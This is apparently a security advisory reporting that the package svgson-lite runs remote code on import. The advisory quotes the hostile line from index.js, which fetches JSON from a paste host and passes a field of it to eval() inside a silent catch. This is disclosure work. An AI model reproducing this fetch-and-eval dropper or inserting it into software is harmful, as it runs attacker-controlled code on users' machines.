summary: svgson-lite executes remote code fetched from anonymous paste host on import
details: The package's main entrypoint (index.js) performs an unconditional top-level fetch to https://jsonkeeper.com/b/3P9BF and passes a field of the returned JSON directly to eval(): `fetch("https://jsonkeeper.com/b/3P9BF").then(...).then((data) => { eval(data.model);... }).catch((error) => {})`. The fetch fires on every `require`/`import` of the module, so any consumer that loads svgson-lite executes attacker-controlled code retrieved at load time from a mutable anonymous paste service. Errors are silently swallowed by an empty catch, concealing the behavior from consumers. The package advertises itself as a small SVG helper, so the fetch-and-eval has no relation to the declared purpose and functions as a stealth dropper. jsonkeeper.com is an anonymous, author-mutable paste host — today's payload can be replaced with different code at any time without republishing the package.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
